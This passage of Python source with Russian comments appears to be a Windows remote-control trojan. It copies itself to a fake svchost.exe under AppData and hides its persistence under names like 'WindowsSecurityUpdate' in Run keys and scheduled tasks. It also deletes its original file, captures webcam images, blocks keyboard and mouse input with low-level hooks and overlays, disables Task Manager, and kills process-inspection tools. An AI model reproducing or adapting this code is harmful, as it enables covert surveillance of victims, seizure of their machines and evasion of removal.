            "\\Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeSystem",
            "\\Microsoft\\Windows\\Registry\\RegIdleBackup",
            "\\Microsoft\\Windows\\SystemRestore\\SR",
        ]
        
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        
        for task_name in task_names:
            try:
                check = subprocess.run(
                    f'schtasks /Query /TN "{task_name}"',
                    shell=True,
                    startupinfo=si,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    capture_output=True,
                    timeout=3
                )
                
                if check.returncode == 0:
                    subprocess.run(
                        f'schtasks /Delete /TN "{task_name}" /F',
                        shell=True,
                        startupinfo=si,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        capture_output=True,
                        timeout=5
                    )
                    removed = True
            except:
                pass
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            value_names = ["SecurityHealthService", "WindowsSecurityUpdate", "SystemHostProcess"]
            
            for value_name in value_names:
                try:
                    winreg.DeleteValue(key, value_name)
                    removed = True
                except:
                    pass
                
            winreg.CloseKey(key)
        except:
            pass
        
        return removed
    

    def add_to_startup_registry(executable_path):
        """Добавляет в Registry Run — работает даже если Task Scheduler провалился."""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{executable_path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False

    def ensure_persistence():
        """Обеспечивает персистентность."""
        if not getattr(sys, 'frozen', False):
            return False

        target_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHost')
        target_exe_name = 'svchost.exe'
        target_path = os.path.join(target_dir, target_exe_name)

        original_path = get_executable_path()

        if original_path.lower() == target_path.lower():
            # Уже в целевой директории — обновим точки автозагрузки
            add_to_startup_registry(original_path)
            return False

        try:
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(original_path, target_path)

            # ТРИ точки автозагрузки для надёжности:
            add_to_startup(target_path)  # Task Scheduler (COM API или schtasks)
            add_to_startup_registry(target_path)  # Registry Run

            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE

            subprocess.Popen([target_path], startupinfo=si, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)

            temp_dir = os.environ.get('TEMP', '.')
            bat_path = os.path.join(temp_dir, f'cleanup_{os.getpid()}.cmd')

            bat_content = f'''@echo off
timeout /t 3 /nobreak >nul
del /F /Q "{original_path}"
del /F /Q "%~f0"
'''
            with open(bat_path, 'w') as f:
                f.write(bat_content)

            subprocess.Popen(['cmd.exe', '/c', bat_path], startupinfo=si, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)

            return True

        except Exception as e:
            _log_to_file(f"Self-delete failed: {e}")
            return False
    
    
    def capture_webcam():
        """Захватывает фото с веб-камеры через OpenCV."""
        if cv2 is None:
            return None
        
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return None
            
            time.sleep(0.5)
            
            ret, frame = cap.read()
            cap.release()
            
            if not ret or frame is None:
                return None
            
            success, buffer = cv2.imencode('.jpg', frame)
            if not success:
                return None

            return buffer.tobytes()

        except Exception as e:
            _log_to_file(f"Webcam capture failed: {e}")
            return None


    def disable_input_devices_overlay(duration=10):
        """Блокировка ввода через множественные overlay окна на всех мониторах."""
        try:
            import tkinter as tk
            from ctypes import windll, wintypes

            # Получаем информацию о всех мониторах
            def get_all_monitors():
                """Возвращает список всех мониторов с их координатами."""
                monitors = []

                def enum_callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
                    rect = lprcMonitor.contents
                    monitors.append({
                        'x': rect.left,
                        'y': rect.top,
                        'width': rect.right - rect.left,
                        'height': rect.bottom - rect.top
                    })
                    return True

                MonitorEnumProc = ctypes.WINFUNCTYPE(
                    ctypes.c_bool,
                    ctypes.c_ulong,
                    ctypes.c_ulong,
                    ctypes.POINTER(wintypes.RECT),
                    ctypes.c_double
                )

                windll.user32.EnumDisplayMonitors(
                    None, None, MonitorEnumProc(enum_callback), 0
                )

                # Если мониторы не найдены, возвращаем дефолтный
                if not monitors:
                    user32 = windll.user32
                    monitors = [{
                        'x': 0,
                        'y': 0,
                        'width': user32.GetSystemMetrics(0),
                        'height': user32.GetSystemMetrics(1)
                    }]

                return monitors

            def create_blocking_overlay():
                try:
                    monitors = get_all_monitors()

                    # Создаём главное невидимое окно
                    root = tk.Tk()
                    root.withdraw()  # Скрываем главное окно

                    overlay_windows = []
                    stop_flag = [False]

                    # Создаём overlay для каждого монитора
                    for idx, monitor in enumerate(monitors):
                        overlay = tk.Toplevel(root)
                        overlay.overrideredirect(True)

                        # Устанавливаем геометрию на весь монитор
                        overlay.geometry(f"{monitor['width']}x{monitor['height']}+{monitor['x']}+{monitor['y']}")

                        # Настройки окна
                        overlay.attributes('-topmost', True)
                        overlay.attributes('-alpha', 0.01)  # Почти невидимое (1%)
                        overlay.configure(bg='black', cursor='none')

                        # Захватываем весь ввод
                        overlay.focus_force()
                        overlay.grab_set_global()  # Глобальный захват

                        # Блокируем ВСЕ события
                        def block_all(event=None):
                            return "break"

                        # Клавиатура
                        overlay.bind('<Key>', block_all)
                        overlay.bind('<KeyPress>', block_all)
                        overlay.bind('<KeyRelease>', block_all)

                        # Мышь
                        overlay.bind('<Button>', block_all)
                        overlay.bind('<ButtonPress>', block_all)
                        overlay.bind('<ButtonRelease>', block_all)
                        overlay.bind('<Motion>', block_all)
                        overlay.bind('<Enter>', block_all)
                        overlay.bind('<Leave>', block_all)

                        # Системные комбинации
                        overlay.bind('<Alt-F4>', block_all)
                        overlay.bind('<Control-Alt-Delete>', block_all)
                        overlay.bind('<Control-Shift-Escape>', block_all)
                        overlay.bind('<Escape>', block_all)
                        overlay.bind('<Alt-Tab>', block_all)
                        overlay.bind('<Super_L>', block_all)  # Win key
                        overlay.bind('<Super_R>', block_all)

                        # Блокируем правый клик
                        overlay.bind('<Button-3>', block_all)

                        # Блокируем фокус
                        overlay.bind('<FocusOut>', lambda e: overlay.focus_force())

                        overlay_windows.append(overlay)

                    # Функция для поддержания окон поверх всех
                    def keep_on_top():
                        if stop_flag[0]:
                            return

                        try:
                            for overlay in overlay_windows:
                                overlay.lift()
                                overlay.attributes('-topmost', True)
                                overlay.focus_force()
                        except:
                            pass
                        
                        if not stop_flag[0]:
                            root.after(100, keep_on_top)  # Каждые 100ms

                    # Автоматическое закрытие
                    def auto_close():
                        stop_flag[0] = True
                        try:
                            for overlay in overlay_windows:
                                overlay.destroy()
                            root.quit()
                            root.destroy()
                        except:
                            pass
                        
                    # Запускаем таймер закрытия
                    root.after(duration * 1000, auto_close)

                    # Запускаем функцию поддержания поверх всех
                    root.after(50, keep_on_top)

                    # Главный цикл
                    try:
                        root.mainloop()
                    except:
                        pass
                    
                except Exception:
                    pass
                
            # Запускаем в отдельном потоке
            thread = threading.Thread(target=create_blocking_overlay, daemon=True)
            thread.start()

            return True

        except Exception:
            return False


    def disable_input_devices_hook(duration=10):
        """Улучшенная блокировка ввода через keyboard/mouse hooks."""
        if platform.system() != "Windows":
            return False

        try:
            import ctypes
            from ctypes import wintypes

            # WinAPI константы
            WH_KEYBOARD_LL = 13
            WH_MOUSE_LL = 14

            # Глобальные переменные для hooks
            keyboard_hook = None
            mouse_hook = None
            stop_flag = threading.Event()

            # Структура для keyboard hook
            class KBDLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("vkCode", wintypes.DWORD),
                    ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD),
                    ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
                ]

            # Структура для mouse hook
            class MSLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("pt", wintypes.POINT),
                    ("mouseData", wintypes.DWORD),
                    ("flags", wintypes.DWORD),
                    ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
                ]

            # Keyboard hook callback - блокируем ВСЕ клавиши
            def keyboard_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    # Блокируем все нажатия без исключений
                    return 1
                return ctypes.windll.user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

            # Mouse hook callback - блокируем ВСЕ движения и клики
            def mouse_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    # Блокируем все события мыши без исключений
                    return 1
                return ctypes.windll.user32.CallNextHookEx(mouse_hook, nCode, wParam, lParam)

            # Создаём C-callbacks
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
            keyboard_callback = HOOKPROC(keyboard_proc)
            mouse_callback = HOOKPROC(mouse_proc)

            def hook_thread():
                nonlocal keyboard_hook, mouse_hook

                try:
                    # Устанавливаем hooks
                    keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
                        WH_KEYBOARD_LL,
                        keyboard_callback,
                        ctypes.windll.kernel32.GetModuleHandleW(None),
                        0
                    )

                    mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
                        WH_MOUSE_LL,
                        mouse_callback,
                        ctypes.windll.kernel32.GetModuleHandleW(None),
                        0
                    )

                    if not keyboard_hook or not mouse_hook:
                        return

                    # Message loop с таймером
                    msg = wintypes.MSG()
                    start_time = time.time()

                    while not stop_flag.is_set() and (time.time() - start_time) < duration:
                        # Обрабатываем сообщения
                        while ctypes.windll.user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

                        time.sleep(0.001)  # 1ms sleep для CPU

                except Exception:
                    pass
                finally:
                    # Снимаем hooks
                    try:
                        if keyboard_hook:
                            ctypes.windll.user32.UnhookWindowsHookEx(keyboard_hook)
                        if mouse_hook:
                            ctypes.windll.user32.UnhookWindowsHookEx(mouse_hook)
                    except:
                        pass
                    
            # Запускаем hooks в отдельном потоке с высоким приоритетом
            thread = threading.Thread(target=hook_thread, daemon=True)
            thread.start()

            # Автоматическая остановка
            def auto_stop():
                time.sleep(duration)
                stop_flag.set()

            timer = threading.Thread(target=auto_stop, daemon=True)
            timer.start()

            return True

        except Exception:
            return False


    def disable_input_devices_combined(duration=10):
        """Комбинированная блокировка ввода (overlay + hooks)."""
        try:
            # Запускаем оба метода одновременно для максимального эффекта
            overlay_started = disable_input_devices_overlay(duration)
            hooks_started = disable_input_devices_hook(duration)

            return overlay_started or hooks_started

        except Exception:
            return False
    
    
    def rotate_display(rotation_angle):
        """Поворачивает ВСЕ дисплеи на указанный угол."""
        try:
            rotation_map = {
                0: 0,
                90: 1,
                180: 2,
                270: 3
            }
            
            if rotation_angle not in rotation_map:
                return False
            
            target_orientation = rotation_map[rotation_angle]
            
            class DEVMODE(ctypes.Structure):
                _fields_ = [
                    ('dmDeviceName', ctypes.c_wchar * 32),
                    ('dmSpecVersion', ctypes.c_ushort),
                    ('dmDriverVersion', ctypes.c_ushort),
                    ('dmSize', ctypes.c_ushort),
                    ('dmDriverExtra', ctypes.c_ushort),
                    ('dmFields', ctypes.c_ulong),
                    ('dmPositionX', ctypes.c_long),
                    ('dmPositionY', ctypes.c_long),
                    ('dmDisplayOrientation', ctypes.c_ulong),
                    ('dmDisplayFixedOutput', ctypes.c_ulong),
                    ('dmColor', ctypes.c_short),
                    ('dmDuplex', ctypes.c_short),
                    ('dmYResolution', ctypes.c_short),
                    ('dmTTOption', ctypes.c_short),
                    ('dmCollate', ctypes.c_short),
                    ('dmFormName', ctypes.c_wchar * 32),
                    ('dmLogPixels', ctypes.c_ushort),
                    ('dmBitsPerPel', ctypes.c_ulong),
                    ('dmPelsWidth', ctypes.c_ulong),
                    ('dmPelsHeight', ctypes.c_ulong),
                    ('dmDisplayFlags', ctypes.c_ulong),
                    ('dmDisplayFrequency', ctypes.c_ulong),
                    ('dmICMMethod', ctypes.c_ulong),
                    ('dmICMIntent', ctypes.c_ulong),
                    ('dmMediaType', ctypes.c_ulong),
                    ('dmDitherType', ctypes.c_ulong),
                    ('dmReserved1', ctypes.c_ulong),
                    ('dmReserved2', ctypes.c_ulong),
                    ('dmPanningWidth', ctypes.c_ulong),
                    ('dmPanningHeight', ctypes.c_ulong),
                ]
            
            class DISPLAY_DEVICE(ctypes.Structure):
                _fields_ = [
                    ('cb', ctypes.c_ulong),
                    ('DeviceName', ctypes.c_wchar * 32),
                    ('DeviceString', ctypes.c_wchar * 128),
                    ('StateFlags', ctypes.c_ulong),
                    ('DeviceID', ctypes.c_wchar * 128),
                    ('DeviceKey', ctypes.c_wchar * 128),
                ]
            
            DM_DISPLAYORIENTATION = 0x00000080
            DM_PELSWIDTH = 0x00080000
            DM_PELSHEIGHT = 0x00100000
            DISP_CHANGE_SUCCESSFUL = 0
            DISPLAY_DEVICE_ACTIVE = 0x00000001
            ENUM_CURRENT_SETTINGS = -1
            
            success_count = 0
            device_index = 0
            
            while True:
                display_device = DISPLAY_DEVICE()
                display_device.cb = ctypes.sizeof(DISPLAY_DEVICE)
                
                if not ctypes.windll.user32.EnumDisplayDevicesW(None, device_index, ctypes.byref(display_device), 0):
                    break
                
                if not (display_device.StateFlags & DISPLAY_DEVICE_ACTIVE):
                    device_index += 1
                    continue
                
                device_name = display_device.DeviceName
                
                device_mode = DEVMODE()
                device_mode.dmSize = ctypes.sizeof(DEVMODE)
                
                if not ctypes.windll.user32.EnumDisplaySettingsW(device_name, ENUM_CURRENT_SETTINGS, ctypes.byref(device_mode)):
                    device_index += 1
                    continue
                
                current_orientation = device_mode.dmDisplayOrientation
                current_width = device_mode.dmPelsWidth
                current_height = device_mode.dmPelsHeight
                
                if current_orientation in [1, 3]:
                    base_width = current_height
                    base_height = current_width
                else:
                    base_width = current_width
                    base_height = current_height
                
                device_mode.dmDisplayOrientation = target_orientation
                
                if target_orientation in [1, 3]:
                    device_mode.dmPelsWidth = base_height
                    device_mode.dmPelsHeight = base_width
                else:
                    device_mode.dmPelsWidth = base_width
                    device_mode.dmPelsHeight = base_height
                
                device_mode.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT
                
                result = ctypes.windll.user32.ChangeDisplaySettingsExW(
                    device_name,
                    ctypes.byref(device_mode),
                    None,
                    0,
                    None
                )
                
                if result == DISP_CHANGE_SUCCESSFUL:
                    success_count += 1
                
                device_index += 1
            
            return success_count > 0
            
        except Exception:
            return False
        
    def kill_process_by_name(process_name):
        """Убивает процесс по имени."""
        try:
            killed = False
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == process_name.lower():
                        proc.kill()
                        killed = True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return killed
        except Exception:
            return False


    def close_window_by_title(title_keyword):
        """Закрывает окно по ключевому слову в заголовке."""
        try:
            closed = False

            def enum_callback(hwnd, results):
                try:
                    if win32gui.IsWindowVisible(hwnd):
                        window_title = win32gui.GetWindowText(hwnd)
                        if title_keyword.lower() in window_title.lower():
                            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                            results.append(hwnd)
                except:
                    pass
                return True

            results = []
            win32gui.EnumWindows(enum_callback, results)
            closed = len(results) > 0

            return closed
        except Exception:
            return False


    def block_taskmgr_registry():
        """Блокирует Task Manager через реестр (требует admin)."""
        if not is_admin():
            return False

        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            _log_to_file(f"Failed to block Task Manager via registry: {e}")
            return False


    def unblock_taskmgr_registry():
        """Разблокирует Task Manager через реестр."""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False


    def monitor_and_kill_taskmgr():
        """Непрерывный мониторинг и закрытие Task Manager."""
        global taskmgr_monitor_active

        taskmgr_names = [
            'taskmgr.exe',
            'ProcessHacker.exe',
            'procexp.exe',
            'procexp64.exe'
        ]

        taskmgr_window_titles = [
            'task manager',
            'диспетчер задач',
            'process hacker',
            'process explorer'
        ]

        kill_count = 0

        while taskmgr_monitor_active:
            try:
                # Проверяем процессы
                for proc_name in taskmgr_names:
                    if kill_process_by_name(proc_name):
                        kill_count += 1

                # Проверяем окна
                for title in taskmgr_window_titles:
                    if close_window_by_title(title):
                        kill_count += 1

                time.sleep(0.5)  # Проверка каждые 500ms

            except Exception:
                time.sleep(1)

        return kill_count


    def monitor_and_kill_blocked_apps():
        """Непрерывный мониторинг и закрытие заблокированных приложений."""
        global taskmgr_monitor_active

        kill_count = 0

        while taskmgr_monitor_active:
            try:
                # Получаем список заблокированных процессов
                blocked_names = set(blocked_apps.keys())

                if not blocked_names:
                    time.sleep(1)
                    continue

                # Проверяем все запущенные процессы
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name']
                        if proc_name and proc_name.lower() in blocked_names:
                            proc.kill()
                            kill_count += 1
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

                # Также проверяем по окнам
                for proc_name in blocked_names:
                    if close_window_by_process_name(proc_name):
                        kill_count += 1

                time.sleep(0.5)  # Проверка каждые 500ms

            except Exception:
                time.sleep(1)

        return kill_count


    def close_window_by_process_name(process_name):
        """Закрывает все окна принадлежащие процессу."""
        try:
            closed = False

            def enum_callback(hwnd, results):
                try:
                    if win32gui.IsWindowVisible(hwnd):
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        try:
                            proc = psutil.Process(pid)
                            if proc.name().lower() == process_name.lower():
                                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                                results.append(hwnd)
                        except:
                            pass
                except:
                    pass
                return True

            results = []
            win32gui.EnumWindows(enum_callback, results)
            return len(results) > 0
        except Exception:
            return False


    def start_taskmgr_monitor():
        """Запускает мониторинг Task Manager и заблокированных приложений."""
        global taskmgr_monitor_active, taskmgr_monitor_thread

        if taskmgr_monitor_active:
            return False  # Уже запущен

        # Блокируем через реестр если есть admin права
        if is_admin():
            block_taskmgr_registry()

        taskmgr_monitor_active = True
        
        # Запускаем оба мониторинга в отдельных потоках
        taskmgr_monitor_thread = threading.Thread(target=monitor_and_kill_taskmgr, daemon=True)
        taskmgr_monitor_thread.start()

        # Запускаем мониторинг заблокированных приложений
        blocked_apps_thread = threading.Thread(target=monitor_and_kill_blocked_apps, daemon=True)
        blocked_apps_thread.start()

        return True


    def stop_taskmgr_monitor():
        """Останавливает мониторинг Task Manager."""
        global taskmgr_monitor_active

        if not taskmgr_monitor_active:
            return False

        taskmgr_monitor_active = False

        # Разблокируем через реестр
        if is_admin():
            unblock_taskmgr_registry()

        return True


    def get_taskmgr_monitor_status():
        """Возвращает статус мониторинга."""
        global taskmgr_monitor_active
        return taskmgr_monitor_active

# ═══════════════════════════════════════════════════════════════════
# SOUND ENGINE (NATIVE WINMM — БЕЗ POWERSHELL)
# ═══════════════════════════════════════════════════════════════════

class SoundSession:
    """Воспроизведение звука через WinMM.dll (mciSendString) без PowerShell."""
    
    def __init__(self, channel):
        self.channel = channel
        self.playing = False
        self.winmm = None
        self.alias = f"snd_{os.getpid()}_{id(self)}"
        self.loop = False
        self.volume = 1.0
        self._stop_event = threading.Event()
        self._loop_thread = None
        self._temp_file = None
        
        if platform.system() == "Windows":
            self.winmm = ctypes.windll.winmm
    
    def play(self, sound_source, volume=100, loop=False):
        """Запускает воспроизведение через mciSendString."""
        if not self.winmm:
            return False
        
        self.stop()
        
        if sound_source.startswith(('http://', 'https://')):
            try:
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = requests.get(sound_source, headers=headers, timeout=30)
                
                if response.status_code != 200:
                    return False
                
                ext = '.mp3'
                if '.wav' in sound_source.lower():
                    ext = '.wav'
                elif '.ogg' in sound_source.lower():
                    ext = '.ogg'
                
                temp_file = os.path.join(
                    os.environ.get('TEMP', '.'),
                    f'snd_{os.getpid()}_{int(time.time())}{ext}'
                )
                
                with open(temp_file, 'wb') as f:
                    f.write(response.content)
                
                file_path = temp_file
                self._temp_file = temp_file
                _TempFileTracker.add(temp_file)
            except:
                return False
        else:
            if not os.path.exists(sound_source):
                return False
            file_path = os.path.abspath(sound_source)
        
        short_path = self._get_short_path(file_path)
        
        cmd = f'open "{short_path}" type mpegvideo alias {self.alias}'
        if self._mci_send(cmd) != 0:
            return False
        
        vol = int(min(1000, max(0, (volume / 100) * 1000)))
        self._mci_send(f'setaudio {self.alias} volume to {vol}')
        
        if self._mci_send(f'play {self.alias}') != 0:
            self._mci_send(f'close {self.alias}')
            return False
        
        self.playing = True
        self.loop = loop
        self.volume = volume / 100
        self._stop_event.clear()
        
        if loop:
            self._loop_thread = threading.Thread(target=self._loop_worker, daemon=True)
            self._loop_thread.start()
        
        return True
    
    def stop(self):
        """Останавливает воспроизведение."""
        if not self.playing:
            return
        
        self._stop_event.set()
        self.playing = False
        
        if self.winmm:
            self._mci_send(f'stop {self.alias}')
            self._mci_send(f'close {self.alias}')
        
        if self._temp_file:
            _TempFileTracker.remove(self._temp_file)
            self._temp_file = None
    
    def _loop_worker(self):
        """Фоновый поток для зацикливания."""
        while not self._stop_event.is_set() and self.loop and self.playing:
            status = ctypes.create_unicode_buffer(255)
            self.winmm.mciSendStringW(
                f'status {self.alias} mode',
                status,
                255,
                0
            )
            
            if 'stopped' in status.value.lower():
                self._mci_send(f'seek {self.alias} to start')
                self._mci_send(f'play {self.alias}')
            
            time.sleep(0.5)
    
    def _mci_send(self, command: str) -> int:
        """Отправка команды mciSendString."""
        if not self.winmm:
            return -1
        return self.winmm.mciSendStringW(command, None, 0, 0)
    
    def _get_short_path(self, long_path: str) -> str:
        """Получение короткого пути Windows (8.3 формат)."""
        try:
            buffer = ctypes.create_unicode_buffer(260)
            ctypes.windll.kernel32.GetShortPathNameW(long_path, buffer, 260)
            return buffer.value if buffer.value else long_path
        except:
            return long_path

# ═══════════════════════════════════════════════════════════════════
# FULLSCREEN ENGINE (ЧИСТЫЙ TKINTER — БЕЗ PYTHONW-ИНЪЕКЦИИ)
# ═══════════════════════════════════════════════════════════════════

def show_fullscreen_image(image_source, stop_event, duration=0, monitors="all"):
    """
    Показывает fullscreen изображение/GIF через tkinter без генерации скриптов.

    Args:
        image_source: URL или путь к файлу
        stop_event: threading.Event для остановки
        duration: время показа в секундах (0 = бесконечно)
        monitors: не используется (для совместимости)

    Returns:
        bool: True если успешно запущено
    """
    print(f"[DEBUG show_fullscreen_image] Starting with source: {image_source}, duration: {duration}")

    if platform.system() != "Windows":
        print(f"[DEBUG show_fullscreen_image] Not Windows, returning False")
        return False

    temp_files = []

    try:
        # Обработка data URI (base64)
        if image_source.startswith('data:image'):
            print(f"[DEBUG show_fullscreen_image] Processing data URI...")
            try:
                # Извлекаем base64 данные из data URI
                header, base64_data = image_source.split(',', 1)
                image_data = base64.b64decode(base64_data)

                # Сохраняем во временный файл
                ext = '.png'
                if 'gif' in header.lower():
                    ext = '.gif'
                elif 'jpeg' in header.lower() or 'jpg' in header.lower():
                    ext = '.jpg'

                temp_image = os.path.join(os.environ.get('TEMP', '.'), f'fs_{os.getpid()}_{int(time.time())}{ext}')
                with open(temp_image, 'wb') as f:
                    f.write(image_data)

                image_path = temp_image
                temp_files.append(temp_image)
                _TempFileTracker.add(temp_image)
                print(f"[DEBUG show_fullscreen_image] Data URI saved to: {image_path}")
            except Exception as e:
                print(f"[DEBUG show_fullscreen_image] Error processing data URI: {e}")
                return False
        elif image_source.startswith(('http://', 'https://')):
            print(f"[DEBUG show_fullscreen_image] Downloading from URL...")
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.get(image_source, headers=headers, timeout=30)

            if response.status_code != 200:
                print(f"[DEBUG show_fullscreen_image] HTTP error: {response.status_code}")
                return False

            ext = '.gif' if '.gif' in image_source.lower() else '.png'
            temp_image = os.path.join(os.environ.get('TEMP', '.'), f'fs_{os.getpid()}_{int(time.time())}{ext}')

            with open(temp_image, 'wb') as f:
                f.write(response.content)

            image_path = temp_image
            temp_files.append(temp_image)
            _TempFileTracker.add(temp_image)
        else:
            print(f"[DEBUG show_fullscreen_image] Checking local file: {image_source}")
            if not os.path.exists(image_source):
                print(f"[DEBUG show_fullscreen_image] File does not exist!")
                return False
            image_path = os.path.abspath(image_source)

        # Проверяем что это валидное изображение без verify()
        try:
            with Image.open(image_path) as test_img:
                _ = test_img.size  # Просто проверяем что можем прочитать размер
        except:
            for f in temp_files:
                _TempFileTracker.remove(f)
            return False

        def display_thread():
            main_img = None
            try:
                print(f"[DEBUG display_thread] Opening image: {image_path}")
                main_img = Image.open(image_path)
                is_animated = getattr(main_img, "is_animated", False)

                # НЕ загружаем все кадры в память сразу — делаем лениво
                frame_count = getattr(main_img, "n_frames", 1)
                delays = []

                # Логируем информацию об изображении
                img_info = {
                    'path': image_path,
                    'size': main_img.size,
                    'mode': main_img.mode,
                    'animated': is_animated,
                    'frames': frame_count
                }
                print(f"[DEBUG display_thread] Image info: {img_info}")

                # Сначала получаем все задержки
                if is_animated:
                    print(f"[DEBUG display_thread] Processing animated GIF with {frame_count} frames")
                    try:
                        for idx in range(frame_count):
                            main_img.seek(idx)
                            delays.append(main_img.info.get('duration', 100))
                        # Возвращаем на первый кадр
                        main_img.seek(0)
                        print(f"[DEBUG display_thread] Got delays: {delays[:10]}...")  # Первые 10
                    except Exception as e:
                        print(f"[DEBUG display_thread] Error getting delays: {e}")
                        delays = [100] * frame_count
                else:
                    delays = [100]

                monitors_list = []

                def enum_callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
                    rect = lprcMonitor.contents
                    monitors_list.append({
                        'x': rect.left,
                        'y': rect.top,
                        'w': rect.right - rect.left,
                        'h': rect.bottom - rect.top
                    })
                    return True

                MonitorEnumProc = ctypes.WINFUNCTYPE(
                    ctypes.c_bool,
                    ctypes.c_ulong,
                    ctypes.c_ulong,
                    ctypes.POINTER(wintypes.RECT),
                    ctypes.c_double
                )

                ctypes.windll.user32.EnumDisplayMonitors(
                    None, None, MonitorEnumProc(enum_callback), 0
                )

                if not monitors_list:
                    user32 = ctypes.windll.user32
                    monitors_list = [{
                        'x': 0,
                        'y': 0,
                        'w': user32.GetSystemMetrics(0),
                        'h': user32.GetSystemMetrics(1)
                    }]

                # Создаём root с уникальным именем чтобы избежать конфликтов
                root = tk.Tk()
                root.title(f"FS_{os.getpid()}_{int(time.time())}")
                root.withdraw()

                windows = []
                canvases = []
                image_items = []
                # ВАЖНО: храним сильные ссылки на PhotoImage чтобы GC не удалял
                current_images = []

                for mon in monitors_list:
                    win = tk.Toplevel(root)
                    win.overrideredirect(True)
                    win.geometry(f"{mon['w']}x{mon['h']}+{mon['x']}+{mon['y']}")
                    win.configure(bg='black', cursor='none')
                    win.attributes('-topmost', True)

                    # Форсируем обновление окна
                    win.update_idletasks()

                    canvas = tk.Canvas(
                        win,
                        width=mon['w'],
                        height=mon['h'],
                        bg='black',
                        highlightthickness=0
                    )
                    canvas.pack(fill=tk.BOTH, expand=True)

                    image_item = canvas.create_image(
                        mon['w'] // 2,
                        mon['h'] // 2,
                        anchor=tk.CENTER
                    )

                    windows.append(win)
                    canvases.append(canvas)
                    image_items.append(image_item)

                    win.bind('<Button-1>', lambda e: stop_event.set())
                    win.bind('<Escape>', lambda e: stop_event.set())

                # ВАЖНО: сначала полностью показываем все окна
                root.update()
                for win in windows:
                    win.update()
                    win.lift()
                    win.attributes('-topmost', True)
                    win.focus_force()

                frame_idx = [0]
                first_frame_drawn = [False]

                def render_frame():
                    """Рендерит текущий кадр на все экраны."""
                    if stop_event.is_set():
                        return False

                    idx = frame_idx[0]

                    # Загружаем кадр
                    try:
                        if not is_animated:
                            # Для статичных изображений не делаем seek
                            frame = main_img
                            if frame.mode not in ('RGB', 'RGBA'):
                                frame = frame.convert('RGBA')
                        else:
                            main_img.seek(idx)
                            frame = main_img.copy()
                            # Для палитровых изображений (режим P) конвертируем через RGB
                            if frame.mode == 'P':
                                frame = frame.convert('RGBA')
                            elif frame.mode not in ('RGB', 'RGBA'):
                                frame = frame.convert('RGBA')
                    except Exception as e:
                        print(f"[DEBUG render_frame] Error loading frame {idx}: {e}")
                        return False

                    rendered_any = False
                    for i, (canvas, item, mon) in enumerate(zip(canvases, image_items, monitors_list)):
                        try:
                            iw, ih = frame.size
                            scale = min(mon['w'] / iw, mon['h'] / ih)
                            nw, nh = int(iw * scale), int(ih * scale)

                            if nw > 0 and nh > 0:
                                resized = frame.resize((nw, nh), Image.Resampling.LANCZOS)
                                # photo = ImageTk.PhotoImage(resized)  # Требует tkinter
                                photo = resized  # Используем PIL Image напрямую
                                current_images.append(photo)  # Сохраняем сильную ссылку

                                # Удаляем старые изображения из списка (освобождаем память)
                                if len(current_images) > len(monitors_list) * 3:
                                    current_images[:-len(monitors_list) * 3] = []

